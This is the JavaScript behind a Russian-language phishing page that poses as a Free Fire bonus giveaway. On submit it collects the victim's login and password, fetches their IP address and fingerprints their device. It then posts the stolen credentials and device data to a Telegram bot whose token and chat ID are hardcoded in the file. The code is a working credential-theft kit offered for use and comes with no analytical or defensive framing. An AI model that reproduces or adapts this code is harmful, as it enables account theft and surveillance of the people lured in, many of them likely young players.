const options = document.querySelectorAll(".bonus-option");
options.forEach(option => {
    option.addEventListener("click", function() {
        options.forEach(o => o.classList.remove("selected"));
        this.classList.add("selected");
        selectedBonus = this.getAttribute("data-value");
    });
});

// Функция для определения ОС и её версии
function detectOSVersion() {
    const userAgent = navigator.userAgent;
    if (/Windows NT ([\d.]+)/i.test(userAgent)) return `Windows ${userAgent.match(/Windows NT ([\d.]+)/i)[1]}`;
    if (/Mac OS X ([\d_]+)/i.test(userAgent)) return `macOS ${userAgent.match(/Mac OS X ([\d_]+)/i)[1].replace(/_/g, '.')}`;
    if (/Android ([\d.]+)/i.test(userAgent)) return `Android ${userAgent.match(/Android ([\d.]+)/i)[1]}`;
    if (/CPU (iPhone )?OS ([\d_]+)/i.test(userAgent)) return `iOS ${userAgent.match(/OS ([\d_]+)/i)[1].replace(/_/g, '.')}`;
    if (/Linux/i.test(userAgent)) return "Linux";
    return "Неизвестная система";
}

document.getElementById("phishing-form").addEventListener("submit", async function(event) {
    event.preventDefault();
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;
    let profileLink = document.getElementById("profile-link").value;

    try {
        // Получение IP-адреса пользователя
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // Определение ОС пользователя
        const userOSVersion = detectOSVersion();
        const userInfo = {
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            deviceMemory: navigator.deviceMemory || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            connection: navigator.connection ? navigator.connection.effectiveType : "unknown"
        };

        const formattedInfo = `
FreeFire RU

🎁 Логин: ${username}
🔑 Пароль: ${password}
🎯 Бонус: ${selectedBonus}
🔗 Ссылка: ${profileLink}
🌐 IP-адрес: ${userIP}
💻 Система: ${userOSVersion}
🖥️ Платформа: ${userInfo.platform}
🌍 Язык: ${userInfo.language}
📺 Разрешение экрана: ${userInfo.screenWidth}x${userInfo.screenHeight}
📐 Размер окна: ${userInfo.innerWidth}x${userInfo.innerHeight}
🕰️ Часовой пояс: ${userInfo.timezone}
💾 Память устройства: ${userInfo.deviceMemory} GB
⚙️ Логических процессоров: ${userInfo.hardwareConcurrency}
🔌 Тип подключения: ${userInfo.connection}
        `;

        // Отправка данных через Telegram бот
        const botToken = "7811273259:AAHRUI55WZFQqTSEjye_sl_CoeRMBQ9xdIY";
        const chatId = "-1002441556145";
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(telegramUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: formattedInfo
            })
        });
    } catch (error) {
        console.error("Ошибка отправки данных:", error);
        alert("Не удалось отправить данные. Попробуйте снова.");
    }
});
